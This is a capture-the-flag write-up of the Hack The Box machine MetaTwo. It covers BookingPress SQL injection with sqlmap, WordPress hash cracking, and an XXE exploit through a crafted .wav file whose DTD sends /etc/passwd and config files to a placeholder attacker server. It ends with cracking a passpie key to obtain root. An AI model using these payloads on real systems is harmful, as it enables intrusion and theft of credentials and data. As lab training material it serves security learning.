https://app.hackthebox.com/machines/MetaTwo

![image](https://user-images.githubusercontent.com/87700008/204091344-de25ad85-8c3c-4687-b735-c111131c05f4.png)
----------------------------------------------------------------------------------------------------------------------------------------------------------------------
# **Enumeration**

#### Port scan :

Starting with a quick Rustscan :

    sudo rustscan -a 10.10.11.186 -- -A -T4 -vv

Found 3 open ports : 

    - 21 FTP
    - 22 SSH
    - 80 HTTP
    
![image](https://user-images.githubusercontent.com/87700008/204091388-96c142e3-52fc-41c3-84ad-48f77fe5f945.png)

![image](https://user-images.githubusercontent.com/87700008/204091502-37d5b172-d611-41f6-b716-100120af98fc.png)

Found a domain to resolve in the HTTP scan result, i.e. http://metapress.htb
![image](https://user-images.githubusercontent.com/87700008/204091652-17bace83-c0ba-4d71-ae2e-ad84e955ab55.png)

Added the domian to the host file in /etc/hosts & browsed on that website, found a regular page created with wordpress.
![image](https://user-images.githubusercontent.com/87700008/204091873-d6ed202b-d263-4ffe-852d-8b9d0edc5fdd.png)

Tried some Anonymous FTP logon but no luck 😕 :

![image](https://user-images.githubusercontent.com/87700008/204127806-544d6160-edb7-404e-82df-146efc167bb7.png)

As detected earlier the website is running on wordpress hence used a wordpress scanner using "wpscan"

![image](https://user-images.githubusercontent.com/87700008/204129169-193b393c-b1b7-4091-a1a1-2c2f92f9b8f3.png)

Since, I have used an api token (which we can get after registering in the website of wpscan) got 28 vulnerabilities :

![image](https://user-images.githubusercontent.com/87700008/204129243-c3b44c92-1432-4ea7-ae75-b9a3ba72cc7e.png)
![image](https://user-images.githubusercontent.com/87700008/204129252-6fbe354e-5662-4de1-8769-11327171ed90.png)
![image](https://user-images.githubusercontent.com/87700008/204129328-701655de-0688-4ed9-9f30-0aca6e27b233.png)


At this time got the idea that the website is vunerable to wordpress.
Also, from the sub-domain enumeration I observed that the '/events' page is running some kind of plugin called "booking press" on version 1.0.10, however this plugin wasn't detected in our WPScan.

![image](https://user-images.githubusercontent.com/87700008/204258930-75c1dda3-c3d8-4c98-9de4-9eef2503de49.png)
----------------------------------------------------------------------------------------------------------------------------------------------------------------------
## **Initial foothold:**

As checked for the exploit for this plugin & version found this content which describes an un-authicated SQLi, ref : https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357

![image](https://user-images.githubusercontent.com/87700008/204264054-e9dfc69f-85c2-48bd-bcb9-eebdf01a18ed.png)

As per thier POC, we can utilise the "_wpnonce", and this value can be extracted from the source code of the "/events" page : 
![image](https://user-images.githubusercontent.com/87700008/204264175-7191be1a-646b-45b8-98f1-593095544e4f.png)

![image](https://user-images.githubusercontent.com/87700008/204265547-d7b3ffdf-6094-40dc-9b43-d89cc353bf80.png)

Now as the plugin has a SQLi vulnerability which we can utilise with the SQL map tool for which we need to save a post request from Burp.
We can utilise the POC code with just some minor modification to change the "_wpnonce" value & send the curl request through Burp using "-x" parameter.

![image](https://user-images.githubusercontent.com/87700008/204266617-a7dadb31-8772-441c-afec-e917afb15482.png)

We have captured the request in Burp :

![image](https://user-images.githubusercontent.com/87700008/204267838-76e99270-aeeb-4d52-972b-58aa899b6458.png)

Now, we have to save the Burp request but before doing that we have to replace injecteion parameter from the query to any number, or we can leave that parameter empty, this is to make sure that SQL map will work properly.

Final query will somewhat look like this :

        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: metapress.htb
        User-Agent: curl/7.85.0
        Accept: */*
        Content-Length: 185
        Content-Type: application/x-www-form-urlencoded
        Connection: close
        
        action=bookingpress_front_get_category_services&_wpnonce=ffcd6fe38a&category_id=33&total_service=1
        
We save the above content in any file such as 'admin-ajax.req' & then we will pass it into the SQL map & then we can use the below query to dump the database.

        sqlmap -r admin.req -p total_service --dbs
        
        - The -r flag tells sqlmap to read the request from the specified file.
        - The -p flag tells sqlmap to test only the specified parameter in our case "total_service" is the vulnuerable paramter.
        - The --dbs flag tells sqlmap to dump all the databases.

After the completion of the scan we can see that the backend DB is running with the MySQL & there are 2 DB that is avilable : 

        - Blog
        - Information_schema
    
![image](https://user-images.githubusercontent.com/87700008/204272071-d53fcdca-4d8d-4d07-b094-ffb8ee519e74.png)

Now, let's dump the blog database first using SQL map & we can do this via this query :

        sqlmap -r admin.req -p total_service -D blog --tables
        
Got this result :

![image](https://user-images.githubusercontent.com/87700008/204272750-5d43bc57-d189-44b9-b0db-9e15bf6b9232.png)

 And similarly we can dump the 'information_schema' table using SQL map.
 Got this log list of tables :
 
 ![image](https://user-images.githubusercontent.com/87700008/204273084-c1c7acdf-3640-4685-bc8b-9b84b7144647.png)

As we have dumped both the DB we can search for some sensitive data & in the blog table we have "wp_users" table which we can dump using SQL map & for dumping we will user this query :

        sqlmap -r admin.req -p total_service -D blog -T wp_users --dump
        
----------------------------------------------------------------------------------------------------------------------------------------------------------------------

#### **Hash cracking:**

Got 2 users hash & id in that table, they are 'admin' & 'manager' :

![image](https://user-images.githubusercontent.com/87700008/204273807-d4726992-efeb-41f8-9e4e-f8b966332e38.png)

Checked the hash in haiti & found that we can crack with HashCat using the mode 400, followd the same in my carcking machine & few seconds got the plain text password of the manager. Also, tried to crack the admin hash but failed to do so, seems like it's a salted hash.

![image](https://user-images.githubusercontent.com/87700008/204276009-695aff59-318e-4f3e-af83-ec8ac5f9b33c.png)
![image](https://user-images.githubusercontent.com/87700008/204275842-0fa29807-a6c5-48e3-b9e0-71a69cb5d537.png)

Now, with the gathered credential tried to logon via FTP but no luck. 😕

![image](https://user-images.githubusercontent.com/87700008/204584357-d2adc61e-23f8-4bd7-96e6-4d6d3daf05a5.png)

Then I went to the wordpress logon website which I found in subdomain enumeration, i.e. : "/wp-login" & logged in using the manager credentials.

![image](https://user-images.githubusercontent.com/87700008/204585120-6451503b-60ab-4ce1-ac8a-f03d8358ac8e.png)
![image](https://user-images.githubusercontent.com/87700008/204585201-16340839-756e-4ac1-9423-82cc9c4dce94.png)

In the website found an upload section which is running on php, so tried to upload some php reverse shell but it's blocking from upload due to security restrictions.

![image](https://user-images.githubusercontent.com/87700008/204587573-cd7d07d1-136f-415f-956d-8ec797f005d7.png)

We have the manager account access & we can also upload some certain files, but how can we exploit?
After searching for hours I again checked for my WPscan results & found this existing vulnerability, which is matching with my current situation :

![image](https://user-images.githubusercontent.com/87700008/204597653-4bb3eb5c-507c-42b5-911e-10011b75c9af.png)
![image](https://user-images.githubusercontent.com/87700008/204597729-ccce349d-ccb6-419e-bbc6-7b83d7b51f35.png)

----------------------------------------------------------------------------------------------------------------------------------------------------------------------
## **Wordpress exploitation:**

Also, found a room in THM with detailed explanation & exploit for the vulnerability, ref : https://tryhackme.com/room/wordpresscve202129447
Followed the steps for the exploit with creating the first file: payload.wav, which contains this payload :

        RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://YOURSEVERIP:PORT/NAMEEVIL.dtd'"'"'>%remote;%init;%trick;]>\x00

And the 2nd file 'NAMEEVIL.dtd' will contain this data,which will read the '/etc/passwd' content of the machine :

        <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
        <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOURSERVERIP:PORT/?p=%file;'>" >
        
Now launch an http server in the same directory as the dtd file.

        php -S 0.0.0.0:PORT

Now upload the malicious .wav to the WordPress application!
And, quickly after uploading the file we got the response in our terminal in b64 format :

![image](https://user-images.githubusercontent.com/87700008/204603298-85179910-f81d-4ff2-83a8-bd9f17d3d0df.png)

Decoded the string & found the /etc/passwd content, which contains a user 'jnelson':

![image](https://user-images.githubusercontent.com/87700008/204604624-b474cadc-1e8a-42e0-a4ba-d151074ed39a.png)

Now, lets search for WordPress wp-config.php file, but for that we need the path for that directory. From the htm source code we already observedthat it's running nginx let's check the nginx configuration first, to do that we can just change the location in our .dtd file from /etc/passwd to '/etc/nginx/sites-enabled/default'.

Edited & request with payload & qquickly got the response in b64 format, decoded & observed a location which might running 'wp-config.php' file:

![image](https://user-images.githubusercontent.com/87700008/204608384-426692ad-45c7-43aa-a998-6b499bafa1fb.png)

The location observed from the nginx config file is : '/var/www/metapress.htb/blog', let's use this location in our payload request to check for the configuration file.

Edited & requested the paramter & got this response, which contains multiple sensitive information along with the FTP username & password :

![image](https://user-images.githubusercontent.com/87700008/204613062-b806b0bd-7b6d-4f3d-85b0-1aa31b66ee8d.png)

Using the gathered credentials I am able to login into FTP where I found two directories, blog & mailer:

![image](https://user-images.githubusercontent.com/87700008/204615085-92841734-cf01-4d52-87b4-4c848d277707.png)

Mailer directory conrtains some php script 'send_email.php', downloaded the script into the kali machine. Checked the script content & found the **jnelson** credentials in it :

![image](https://user-images.githubusercontent.com/87700008/204615471-6a432641-8748-4557-b16e-8b62e3880f5b.png)

----------------------------------------------------------------------------------------------------------------------------------------------------------------------

##### **User flag :**

Using gathered credentials trying to log in via ssh & successfully logged in this time. (pwned!🙂)

![image](https://user-images.githubusercontent.com/87700008/204616273-d1b026d6-94a6-4458-a65d-fb835a5a19bc.png)

----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## **Root access:**

As visible in the user folder found there is a folder called 'passpie' which contains root user ssh keys but seems like it's in gpg encrypted form:

![image](https://user-images.githubusercontent.com/87700008/204628452-bb28b975-4bce-434d-afcd-7e477e4b63c8.png)

Did some searching on google & found 'passpie' is a CLI password manager written in python. Also, there is another file in 'passpie' folder name 'keys' which seems like holding keys for decrypting the password. Let's copy the file into our kali machine.

'keys' file contains 2 block publick & private, I only copied the private block & created a file in my kali box.

![image](https://user-images.githubusercontent.com/87700008/204629817-635c555d-a89b-4388-9cda-73f8bf53db2b.png)

Converted the 'keys' gpg file into 'john the ripper' format to crack it:

![image](https://user-images.githubusercontent.com/87700008/204630557-0901236f-6e34-4a00-8785-691bb7486ec8.png)

Using JTR easily cracked the password :

![image](https://user-images.githubusercontent.com/87700008/204630664-c69345e9-22ad-475b-bff2-ed8ff4a1e4f0.png)

Now, we have the password we can just export the password into any of our own created file:

        passpie list
        touch passwords
        passpie export passwords
        
![image](https://user-images.githubusercontent.com/87700008/204631820-9d038423-4a53-4c4f-9a40-681608ff1761.png)

And got the root password as well, now we can switch into root user & collect the root flag. (pwned!🙂)

![image](https://user-images.githubusercontent.com/87700008/204632504-1bcfd7f7-40b1-4508-b896-0e320cda51a8.png)



















